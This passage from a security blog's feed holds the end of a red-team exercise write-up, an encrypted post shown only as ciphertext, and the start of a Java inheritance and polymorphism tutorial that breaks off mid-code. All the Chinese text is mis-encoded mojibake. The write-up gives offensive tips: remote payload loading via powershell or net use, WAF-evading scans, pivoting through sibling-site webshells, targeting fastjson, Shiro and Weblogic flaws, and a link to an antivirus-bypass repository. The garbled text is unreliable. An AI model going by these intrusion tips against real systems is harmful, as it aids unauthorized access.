äº†ä¸çŸ¥é“æ˜¯å“ªä¸ªå…¬é¸¡é˜Ÿçš„frpå“ˆå“ˆã€‚</p><p>æœ‰çš„æœºå™¨ï¼Œæ‹¿ä¸‹æƒé™ä¹‹åï¼Œä¸èƒ½ç›´æ¥æ‰˜æ–‡ä»¶ã€‚åªèƒ½è‡ªå·±ä¸‹è½½ï¼ˆè¿œç¨‹åŠ è½½ï¼‰ï¼š</p><ul><li>powershell</li><li>net use</li><li>â€¦â€¦</li></ul><p>æœ€åå°±è¯´ä¸‹åˆ†å·¥å§ï¼Œæ‰“çº¢é˜Ÿåˆ†å·¥çœŸçš„æ˜¯å¾ˆé‡è¦çš„ï¼Œå¦‚æœæ˜¯æ··æˆ˜æ¨¡å¼ï¼Œå³æ‰€æœ‰å…¬é¸¡é˜Ÿçš„ç›®æ ‡éƒ½æ˜¯ä¸€æ ·çš„ï¼Œé‚£å°±æ˜¯æ¯”è°å…ˆå‘ç°æ¼æ´äº†ï¼Œè°å‘ç°çš„æ—©ï¼Œè°æŠ¥å‘Šäº¤çš„æ—©ï¼Œåˆ†å°±èƒ½æ‹¿åˆ°ï¼Œå‘ç°çš„æ™šäº†ï¼Œè¦ä¹ˆç›®æ ‡è¢«æ‰“å‡ºå±€ï¼Œè¦ä¹ˆæ´å°±è¢«ä¿®äº†ã€‚</p><blockquote><p>è¿™æ¬¡å°±æ˜¯å› ä¸ºæˆ‘ä»¬è§‰å¾—æŸç³»ç»Ÿä¸å¥½æ‰“ï¼Œæ™šç‚¹çœ‹ï¼Œç­‰å»çœ‹å‘ç°æ˜¯shiroçš„æ—¶å€™ï¼Œå·²ç»æ‰“ä¸äº†shiro550äº†ã€‚å› ä¸ºå¥‡å®‰ä¿¡çš„äººæ‰“äº†ï¼Œå¹¶ä¸”é€šè¿‡è¿™ä¸ªæ‰“è¿›å»äº†ï¼Œæ‹¿äº†1W+åˆ†ã€‚åé¢ç›®æ ‡é‚£è¾¹æŠŠshiroå‡çº§äº†ï¼Œæˆ‘ä»¬å°±æ²¡åŠæ³•äº†ï¼Œåœ¨è¿™é‡Œå¤±åˆ†äº†ã€‚æ‰€ä»¥ è¯´ï¼Œè¿˜æ˜¯ä¿¡æ¯æœé›†ä¸åˆ°ä½ã€‚</p></blockquote><p>è¿™é‡Œæåˆ°äº†ä¿¡æ¯æœé›†ï¼Œå°±è¯´ä¸‹æ”»é˜²æ—¶ä¿¡æ¯æœé›†çš„é—®é¢˜ï¼š</p><ul><li>å¾ˆå¤šç›®æ ‡æ²¡æœ‰åŸŸå</li><li>åŸŸååŸºæœ¬æ²¡æœ‰æˆ–è€…å¾ˆå°‘å­åŸŸå</li><li>æ²¡æœ‰SSLè¯ä¹¦</li><li>å¤‡æ¡ˆå·æŸ¥è¯¢ç”šè‡³å·®ä¸å¤šå†å²åŸŸå</li><li>ä¼æŸ¥æŸ¥åŸºæœ¬æ²¡å•¥ç”¨</li><li>fofaéƒ½æ²¡æ”¶å½•è¿™äº›ç«™ç‚¹</li><li>æŸäº›ç«™ç‚¹çº¯é™æ€</li><li>ç›®æ ‡ç³»ç»Ÿä¸Šäº‘</li><li>ç›®æ ‡åªæ˜¯å½“åœ°ç³»ç»Ÿï¼Œä½†æ˜¯æ‰˜ç®¡æ˜¯å…¨å›½èŒƒå›´çš„</li><li>ç›®æ ‡ç³»ç»ŸIPä¸ºä¾›åº”å•†IPï¼Œç»Ÿä¸€ç®¡ç†</li></ul><p>ä¸€äº›æ–¹æ³•æ¥æ‰©å¤§èµ„äº§ï¼š</p><ul><li>Cæ®µæ‰«æï¼ŒGobyæ¨èï¼Œæ‰«çš„å¿«ï¼Œè¿˜èƒ½æ¢æµ‹ä¸€äº›æ´ï¼Œä¼°è®¡ç¼ºç‚¹å°±æ˜¯å¯èƒ½ä¼šé—æ¼ï¼Œæˆ‘è¿˜æ²¡ç ”ç©¶ä¸ºä»€ä¹ˆgobyèƒ½æ‰«çš„è¿™ä¹ˆå¿«ã€‚</li><li>å•ä¸€IPå…¨ç«¯å£æ‰«æ</li><li>æ—ç«™ï¼ˆæ‹¿ä¸‹æ—ç«™WebShellå¯ä»¥è¯•ç€è·³ç›®å½•è¿‡å»ï¼Œå»è¯»ã€ä¸‹è½½æºç å•¥çš„ï¼Œä½†æ˜¯ä¸€èˆ¬ä¸å¯è¡Œ</li><li>IPæŸ¥å†å²åŸŸå</li><li>ç›®å½•æ‰«ææ¨èç™½åå•ç›®å½•ï¼Œä¸è¦å»æ¢æµ‹ä¸€äº›ä¿¡æ¯æ³„éœ²çš„ç›®å½•ï¼Œå®¹æ˜“è¢«WAFé˜»æ–­</li><li>æŒ‡çº¹è¯†åˆ«ï¼Œä¸è¦è¿‡åº¦ä¾èµ–æ’ä»¶æˆ–è€…ç®€å•å‡­å€Ÿç»éªŒã€‚ä¸€å®šè¦å»æŠ“åŒ…çœ‹çœ‹ï¼Œçœ‹æ¸…æ¥šäº†</li></ul><p>ä¸€äº›çªç ´ç‚¹ï¼š</p><ul><li>è¿˜æ˜¯æ”»é˜²ç¥å™¨ï¼Œfastjsonã€shiroã€Weblogicï¼ˆè¿™æ¬¡æ²¡æœ‰èƒ½æ‰“çš„ï¼‰ï¼ŒSpringã€‚çš„ï¼Œä¸€å®šè¦é‡ç‚¹å»è¯•è¯•ï¼Œä¸èƒ½æ”¾è¿‡ä»»ä½•ä¸€ä¸ª</li><li>å¼±å£ä»¤æ°¸è¿œçš„ç¥</li><li>å†å²æ¼æ´</li><li>å½“ç„¶æœ‰0dayï¼Œæˆ‘ä¹Ÿæ²¡è¯è¯´</li></ul><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>å¿ƒå¾—ä½“ä¼šå°±è¯´è¿™ä¹ˆå¤šå’¯ã€‚æš´éœ²çš„æˆ‘é—®é¢˜æˆ‘å†…å¿ƒä¹Ÿæ¸…æ¥šäº†ï¼Œè¦æƒ³æˆä¸ºRedTeamè¿˜æœ‰å¾ˆé•¿çš„è·¯è¦èµ°~</p><p><strong>ä¸€å®šè¦å¤šå®æˆ˜ï¼</strong></p><hr><p>æ¨èä¸€äº›èµ„æ–™ï¼šgithub yyds</p><p><a href="https://github.com/fengjixuchui/RedTeamer">https://github.com/fengjixuchui/RedTeamer</a></p><p><a href="https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki">https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki</a></p><p><a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a></p><p><a href="https://github.com/foobarto/redteam-notebook">https://github.com/foobarto/redteam-notebook</a></p><p><a href="https://github.com/k8gege/K8tools">https://github.com/k8gege/K8tools</a></p><p><a href="https://github.com/Lucifer1993/SatanSword">https://github.com/Lucifer1993/SatanSword</a></p><p><a href="https://github.com/enaqx/awesome-pentest">https://github.com/enaqx/awesome-pentest</a></p><p><a href="https://github.com/TideSec/BypassAntiVirus">https://github.com/TideSec/BypassAntiVirus</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;è¯´åœ¨å‰é¢&quot;&gt;&lt;a href=&quot;#è¯´åœ¨å‰é¢&quot; class=&quot;headerlink&quot; title=&quot;è¯´åœ¨å‰é¢&quot;&gt;&lt;/a&gt;è¯´åœ¨å‰é¢&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;é¦–å…ˆï¼Œèœé¸¡é“æ­‰ï¼ŒDBQå¦ä¸€ä½å¤§å¸ˆå‚…ï¼æˆ‘å¤ªèœäº†ï¼Œæ²¡èƒ½æ‹¿åˆ°ç¬¬ä¸€ã€‚æœ€ç»ˆæ‹¿äº†ç¬¬ä¸‰ï¼ŒäºŒç­‰å¥–ï¼Œæœ¬åœ°å‚å•†ç¬¬ä¸€ã€‚&lt;</summary>
      
    
    
    
    
    <category term="çº¢è“å¯¹æŠ—" scheme="https://hack-for.fun/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
  </entry>
  
  <entry>
    <title>é’ˆå¯¹å‡ ä¸ªå…¸å‹é—®é¢˜çš„å›ç­”</title>
    <link href="https://hack-for.fun/995.html"/>
    <id>https://hack-for.fun/995.html</id>
    <published>2020-11-09T10:50:32.000Z</published>
    <updated>2020-12-03T03:32:01.169Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="æŠ±æ­‰, è¿™ä¸ªå¯†ç çœ‹ç€ä¸å¤ªå¯¹, è¯·å†è¯•è¯•." data-whm="æŠ±æ­‰, è¿™ä¸ªæ–‡ç« ä¸èƒ½è¢«æ ¡éªŒ, ä¸è¿‡æ‚¨è¿˜æ˜¯èƒ½çœ‹çœ‹è§£å¯†åçš„å†…å®¹."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="æ‚¨å¥½, è¿™é‡Œéœ€è¦å¯†ç ." /><label>æ‚¨å¥½, è¿™é‡Œéœ€è¦å¯†ç .</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="1f7c801b1dccc4337426f0c2f22dfcc69bff4a3af8960b7eb2d3937e44bbe56a">ffec7d04fd4c92f5bf0cf7d4742b747128cd71842845ca462b867e7a80a8181ad32d935726e14e03f5923455db6354097d9f51e534685a0d1c0427e177233ea78ef44d1187590dfb515f60369c2f4c318ace3cdb5296b216ea772f73dc4ebf33655541ad6232527c31e94b055d40003f5aa55b94d16b6a1689ad5370eeaf8ec0b702486231dad15e16ae4f83147f2b581d587af89505cca1635f5fa395982a4a949c8a4bb6347a483135ab9d1b61498dc149bce9a91fcf4860aa2c1139086e2ca56ad4d60570fa96c3a7bda711eec7b2262ab166fef09887fcded875b076675ce57572b4fd519cbf3cede7a75e230774eece2add110233523dd3f1f25713a3abb0cbc51eb1c2b5b11f6d07c101ac3d8ebdefc7fd9a1d8642fc485c219389b6ba99d5f892910109d064429407215adbc2cc7bd5d7107ced1e0df99e279a3bb2dd2c4c3e81f3cfaa6c75a05df433808c864058acd7f8456eafa6b8504f3a5cbbf2dcf15b06409cace8da071fa3f9e097bc84e097a7d18a1c0e0a47a38d9c565759feb9ba5e58f07b50e2107b01de0334372f1d19d43ddf1205fff2c4a7074f36bb8fc381d91c03cbb3653b5b06ed55d704afd2b4710ff405ec9e5a4b776f39f23d374b7605607eb0214a47d9c295cf0d9105305ca3d510c3ed819269ed4323b3145acb4887ffc0d09e880917629716e637c3d7bbd4a59dac4724bc129abee48e328e2449cec9a0464f23294a23f3d301531dd2a36e12f5b33b1128efae022e35ab9b8dab6f1d19627f90320db230dff01aa0c81352b3246819885b9f69b1af18f562de10e37149079b65597850af5ebd69520ce2a953d5d92fb18884ff76138deb4c65183c66dd61c3db1844773068f19b74321c73f22dbc6abaab10e1e22b4f97431595c1ca8c574ebce1f8e08130d64faf3c625f6c89cc0c699dfb9fb0e363407a46f183636de48cc7c62118eb9e087f9a6137a53226ea48bf0ffd3b96776dc9a11ce77f1501f68279cb0b2d724a816556094e60c46d7b040051c6a75d9a73f7d4943d641572e241250e6d72278606f54fc821aca3387de5c1fc26fa1357a9e0ef63821cbcb11aefb7d2209aa6c1e63c9b991a3dded66ea6067f07f00c95b6d48478a2b60e90a08e647d0792d300fafa0c8a2310df4145f4872c5bf44d87d81cc914de7b1b6476e03e09c761b266d3bdfd7db953a0f93ab4d994541d83fb4abc79b922da52b736c9055ed18a3e6f961153af28de4a22b9267dd92fc0854f55efc754095f10c6641ac19802e9c9e8d11f692c4b677c23900dac6d59ccdf953283e14a1be8e0743586accf7f8599f490d242bf596bfdccef4aae2b0a62d228d228c81f8872ae66028d4bc1baa722b3d30ca19c2cc45895cfb67b74894e32158a8059fff075636e986d5dbb035cce009d2a0ea7c19e46d9a853c78b7cd6a27d09739a0c5e0b971e40b7004fd7a75bf6d194c8678a28b13756758da224d63c9fbd1221a4465abe940c5752faa599fbdbc77d4afc6e583f95f7d98486faaafa7946ba4c24d98be1ee2e582aa551745937b027ddf36bca5361d2760b3737f6ebbb98177a43d8b408e7950caded5c57554246aaf41bf52665bf90553c18a473258f9f7229d7f1933006ee6af4afb76c99af939e05c910b4076ea29dc9bdf2477828bec35f21f2c0865677823621ec6ef694bdb34d4c2fc7c09262aa57b30e68bdf2951ad321336be101bdab4871398655b9ef1f8b702b78430f8dbc7fd09de08c1d73ad8339f1919f876e60c55885d6dd0a910c6f0e49de4d52ce3aa1c89eabbf4e0b64cdd6b8c1063cdefc0c9cc123e58585e1d55f530e19deff04c93f79e47ba89fb3a65d070755a7987545165dba0bb0a092b70e7cd6e09cf1c03a981a2e578d78ffaac55a6a704e4fc62fb03b774686555da7869ff87b52210ab084ef5f1288f53ca556b2492a1985349da66bfefc363b2c9443ab1ac3d771708f7ee535f98afd4943089e9a39a6813c0f7ba8a538e7334f38e7823809948f2dea8b285c383a0906aa3e32d51b2d0d6252c00ef458d1ee03206e0457a45f088f0a58723b8465861ded9ae26e74f5e119882bac4177fb89828e549b1ce6a45c361844a4632810fca8dbee7e4c5c61604bbd8e37511d8a174e6c00da53471aa5cc5402f917b5cf5ff8fa9b4c4fef98f1054783f3eba6f1191248d1e62b3295cd89976de02e8a28a9718bed1b51dd7c9499609f2c5c72fa5215f6850d89579740c193b9da2624dd64ba12e934c8c9a1e8fb07618788b287ed374ab2d6e510d93f991e3a75926364d22af786c49e4958bf349e2641a74e08a60fa8719ebcb9f89ba7a42ed53f8ece370947105963897e3cdea99f662996de208a2f89769112821e156ff423962daee0f3cc54150639fa75927c7ba038a095a4482a40598caa7e04a8660421243c4665d2ebfc406f9b5175b8fd19506b8ccd391d168d879d3cf8bf20dd8f214419b8d61718092c1b2cf960248effe31407aaee5339ab71f04e7d83e31e9f6cd5b26d4cbc439d62254a8e2cf6fe18bb5ba26cc78cff4b22c29905874f84663f257aa2d1466ed9debbefa83271dbd4782850e5cac29885c99a686606ab1950e087dba0e74ecf8e876486b690174ffaa3bece37002189a3fce8bc8c9d8e0aedc841c807b38bc99a53f7b451b65411b45ac3e0e0544a682d84fd0e020bc8dd11d358c178cea5d7cd767a7e44b7eb89d65b20680271470a41ef9a745fe5486dd468449049826508b3f525cb389448d6b354df34d6c3f86bca8b5aec043bfebfba081c72990e7fe7bd2a4d55737393cbb840e33a7e65ac9ee8330a6eb8096f22860b0878ab92eaf26dfc7bec296113d15d2c7cc4f607499f081a09f5f307ec9480bff782007846880474974912d946dc1df4a529ca57f1e0d87b6cb087ccdd41ae86613b00addfde7e6efc2ee311939fc6b24103b6c307e5cbfa0e59f9862c878a901824cc43a7af41df7716e998c09d9e75612883de0d6487562a08d10c94653f4579f440499fa104bbf1f7f96cd293035020200d7f42f88206229bf5d1a890209fa5bc2c2fa02d158da8e171cce3e2d29678eaf7a9c96d96218c8b0d85a1a89bf7d8dc0549a17f1135eec6bc9baa4d7f650e68042e46ff1865841fa33866cc110745b211d7895539e3036473c7be6e5c4c34f9a87b4d3c63e85992df6d3836d2a242f18160b42276c1364bee15e56a952b73b71107ba3c1d4bfff1f5ae2c25b5f1363335ba81d391bec862291681cf4f4414c978efc3ba0388d9416b2f4f6720341f96a067cc12a34945359e25a4dc2e649ff12d184b3b10206266adbd58c3bf580d47ac975b57c9e16e08ecb8b019b018adbf8f0023c9473889b9b2632b7585f87d5413a0b4b2bdbcf2d353577f8a6b0295b51d3352b90e38f544a1a4c7cee77275d995df713858ebf5eaf900230e9dfb414fbdabd7b33a261ab8ebfda3a303c274951a940f48accf7e3d26ab1a184498a26d77a156363da58853618c32b15020991211ffb5c660a50873a3ee9e68538a1e630776556c31da887e769556960395c7cc2baccef6d02e05348f50bde6f91b0b39dc5303888171ac73bdae2ac906baf16a1adf0876a476d5bdde4cec5a90e8fb35e29d287d2c17d448c35d7b66a8c6586f4f0edc82407a4eda6b5cc5cff0ecaf09f64b89eaca86345fa8dc4170d8a783df1a07429679aec998535ec116867f5cdcb19b22ec089985a4f60f9bef061b751fedcc623d23730053689b9596b70d2c76a8c840bbfa269304d5cdb0e94b674da88742132d4d804acaa5dead5f6220ebf5a9cf026dc48a935ace083d8e20d23e79cbb5dc42ad4dbb9b46c235f7cceb8e704f0f0ad36732be43c7eb1b6e017df063d121e5b352313560a4ba9f2579117c155e70b330fd0ad4f3ef19496adf58d955a93f64b483b6457585b7ad8f07439e38b233963330c07539c62eb2c8e6b23da39eeae7361933152d2eabef38bbf57f8f34a76102e3669ee31a25bb470e9405af0115454779ac722333c58928bafe628a9924fc251bc210877b6c78653b6fcd09758a9f7e052ec81d41284c5283e5865673d6d25abaece32eb5f6fc48b3a97013c4a6ce23388b88e55f2975cc7a3f2a6a9770c44d15c2480a0b06ab9c30faa0e20fde9b956cbbc49089f3c81b39f16b5d396da564bb3c51cca688bc95ae0f7482cace05088e36c5d373978bc2b3adb33b2c5dc19115a05b5e311b8bd3e6f9f03d542e490e14ac314e8f96473e792cd4fd18ea3fcfab1744223bfa848b381f1e44c58689e093459ce3fc00c1e5314205be076b1aac2ecd85e67305fec15026ece7e6946417e5c877187d8f85b1f0f8afc85fdb7ca6279def275c7293641cd12847229edb0e03cb94512dc458b7c1ea4295a49d0afbdf9adcfad465c96edcb5e498f6d425a760fd10392f2d5aea1da7396bd02aa99c3c5eaed28218fd8c24ab8774ac8f65c1737714b2c8410239df5a28182f232fa150d3d64a8e1de1f1de7c0cf6cf61e63fdf95d5f904205cf1af30ceb3afc3bab650d2acd107b3423fb8f241b08a80f309d7e26fd0b95598844093d13c9abbaa</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">æœ‰ä¸œè¥¿è¢«åŠ å¯†äº†, è¯·è¾“å…¥å¯†ç æŸ¥çœ‹.</summary>
    
    
    
    
    <category term="æ¸—é€æµ‹è¯•" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Coding-Java-ç»§æ‰¿ä¸å¤šæ€ä»¥åŠæŠ½è±¡ç±»ä¸æ¥å£</title>
    <link href="https://hack-for.fun/d300.html"/>
    <id>https://hack-for.fun/d300.html</id>
    <published>2020-11-08T09:14:55.000Z</published>
    <updated>2020-11-08T17:15:05.177Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="å­¦ä¹ èµ„æ–™"><a href="#å­¦ä¹ èµ„æ–™" class="headerlink" title="å­¦ä¹ èµ„æ–™"></a>å­¦ä¹ èµ„æ–™</h1><p><a href="https://www.bilibili.com/video/BV1754y1X7n9?from=search&amp;seid=6059305124304871168">https://www.bilibili.com/video/BV1754y1X7n9?from=search&amp;seid=6059305124304871168</a></p><p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260454185794944">https://www.liaoxuefeng.com/wiki/1252599548343744/1260454185794944</a></p><h1 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h1><h3 id="æ„é€ æ–¹æ³•"><a href="#æ„é€ æ–¹æ³•" class="headerlink" title="æ„é€ æ–¹æ³•"></a>æ„é€ æ–¹æ³•</h3><p>ç”±äºæ„é€ æ–¹æ³•æ˜¯å¦‚æ­¤ç‰¹æ®Šï¼Œæ‰€ä»¥æ„é€ æ–¹æ³•çš„åç§°å°±æ˜¯ç±»åã€‚æ„é€ æ–¹æ³•çš„å‚æ•°æ²¡æœ‰é™åˆ¶ï¼Œåœ¨æ–¹æ³•å†…éƒ¨ï¼Œä¹Ÿå¯ä»¥ç¼–å†™ä»»æ„è¯­å¥ã€‚ä½†æ˜¯ï¼Œå’Œæ™®é€šæ–¹æ³•ç›¸æ¯”ï¼Œæ„é€ æ–¹æ³•æ²¡æœ‰è¿”å›å€¼ï¼ˆä¹Ÿæ²¡æœ‰<code>void</code>ï¼‰ï¼Œè°ƒç”¨æ„é€ æ–¹æ³•ï¼Œå¿…é¡»ç”¨<code>new</code>æ“ä½œç¬¦ã€‚</p><p>æ²¡æœ‰åœ¨æ„é€ æ–¹æ³•ä¸­åˆå§‹åŒ–å­—æ®µæ—¶ï¼Œå¼•ç”¨ç±»å‹çš„å­—æ®µé»˜è®¤æ˜¯<code>null</code>ï¼Œæ•°å€¼ç±»å‹çš„å­—æ®µç”¨é»˜è®¤å€¼ï¼Œ<code>int</code>ç±»å‹é»˜è®¤å€¼æ˜¯<code>0</code>ï¼Œå¸ƒå°”ç±»å‹é»˜è®¤å€¼æ˜¯<code>false</code>ï¼š</p><h3 id="æ–¹æ³•é‡è½½"><a href="#æ–¹æ³•é‡è½½" class="headerlink" title="æ–¹æ³•é‡è½½"></a>æ–¹æ³•é‡è½½</h3><p>åœ¨ä¸€ä¸ªç±»ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰å¤šä¸ªæ–¹æ³•ã€‚å¦‚æœæœ‰ä¸€ç³»åˆ—æ–¹æ³•ï¼Œå®ƒä»¬çš„åŠŸèƒ½éƒ½æ˜¯ç±»ä¼¼çš„ï¼Œåªæœ‰å‚æ•°æœ‰æ‰€ä¸åŒï¼Œé‚£ä¹ˆï¼Œå¯ä»¥æŠŠè¿™ä¸€ç»„æ–¹æ³•ååšæˆ<em>åŒå</em>æ–¹æ³•ã€‚ä¾‹å¦‚ï¼Œåœ¨<code>Hello</code>ç±»ä¸­ï¼Œå®šä¹‰å¤šä¸ª<code>hello()</code>æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello, &quot;</span> + name + <span class="string">&quot;!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (age &lt; <span class="number">18</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hi, &quot;</span> + name + <span class="string">&quot;!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello, &quot;</span> + name + <span class="string">&quot;!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ç§æ–¹æ³•åç›¸åŒï¼Œä½†å„è‡ªçš„å‚æ•°ä¸åŒï¼Œç§°ä¸ºæ–¹æ³•é‡è½½ï¼ˆ<code>Overload</code>ï¼‰ã€‚</p><h1 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h1><p>ç»§æ‰¿æ˜¯é¢å‘å¯¹è±¡ç¼–ç¨‹ä¸­éå¸¸å¼ºå¤§çš„ä¸€ç§æœºåˆ¶ï¼Œå®ƒé¦–å…ˆå¯ä»¥å¤ç”¨ä»£ç ã€‚å½“æˆ‘ä»¬è®©<code>Student</code>ä»<code>Person</code>ç»§æ‰¿æ—¶ï¼Œ<code>Student</code>å°±è·å¾—äº†<code>Person</code>çš„æ‰€æœ‰åŠŸèƒ½ï¼Œæˆ‘ä»¬åªéœ€è¦ä¸º<code>Student</code>ç¼–å†™æ–°å¢çš„åŠŸèƒ½ã€‚</p><p>Javaä½¿ç”¨<code>extends</code>å…³é”®å­—æ¥å®ç°ç»§æ‰¿ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;...&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;...&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;...&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;...&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ä¸è¦é‡å¤nameå’Œageå­—æ®µ/æ–¹æ³•,</span></span><br><span class="line">    <span class="comment">// åªéœ€è¦å®šä¹‰æ–°å¢scoreå­—æ®µ/æ–¹æ³•:</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getScore</span><span class="params">()</span> </span>&#123; â€¦ &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setScore</span><span class="params">(<span class="keyword">int</span> score)</span> </span>&#123; â€¦ &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»§æ‰¿æœ‰ä¸ªç‰¹ç‚¹ï¼Œå°±æ˜¯å­ç±»æ— æ³•è®¿é—®çˆ¶ç±»çš„<code>private</code>å­—æ®µæˆ–è€…<code>private</code>æ–¹æ³•</p><p>ä»»ä½•<code>class</code>çš„æ„é€ æ–¹æ³•ï¼Œç¬¬ä¸€è¡Œè¯­å¥å¿…é¡»æ˜¯è°ƒç”¨çˆ¶ç±»çš„æ„é€ æ–¹æ³•ã€‚å¦‚æœæ²¡æœ‰æ˜ç¡®åœ°è°ƒç”¨çˆ¶ç±»çš„æ„é€ æ–¹æ³•ï¼Œç¼–è¯‘å™¨ä¼šå¸®æˆ‘ä»¬è‡ªåŠ¨åŠ ä¸€å¥<code>super();</code></p><blockquote><p>å¦‚æœçˆ¶ç±»æ²¡æœ‰é»˜è®¤çš„æ„é€ æ–¹æ³•ï¼Œå­ç±»å°±å¿…é¡»æ˜¾å¼è°ƒç”¨<code>super()</code>å¹¶ç»™å‡ºå‚æ•°ä»¥ä¾¿è®©ç¼–è¯‘å™¨å®šä½åˆ°çˆ¶ç±»çš„ä¸€ä¸ªåˆé€‚çš„æ„é€ æ–¹æ³•ã€‚è¿™é‡Œè¿˜é¡ºå¸¦å¼•å‡ºäº†å¦ä¸€ä¸ªé—®é¢˜ï¼šå³å­ç±»<em>ä¸ä¼šç»§æ‰¿</em>ä»»ä½•çˆ¶ç±»çš„æ„é€ æ–¹æ³•ã€‚å­ç±»é»˜è®¤çš„æ„é€ æ–¹æ³•æ˜¯ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆçš„ï¼Œä¸æ˜¯ç»§æ‰¿çš„ã€‚</p></blockquote><h1 id="å¤šæ€"><a href="#å¤šæ€" class="headerlink" title="å¤šæ€"></a>å¤šæ€</h1><blockquote><p>Javaçš„å®ä¾‹æ–¹æ³•è°ƒç”¨æ˜¯åŸºäºè¿è¡Œæ—¶çš„å®é™…ç±»å‹çš„åŠ¨æ€è°ƒç”¨ï¼Œè€Œéå˜é‡çš„å£°æ˜ç±»å‹ã€‚</p></blockquote><p>è¿™ä¸ªéå¸¸é‡è¦çš„ç‰¹æ€§åœ¨é¢å‘å¯¹è±¡ç¼–ç¨‹ä¸­ç§°ä¹‹ä¸ºå¤šæ€ã€‚å®ƒçš„è‹±æ–‡æ‹¼å†™éå¸¸å¤æ‚ï¼šPolymorphicã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 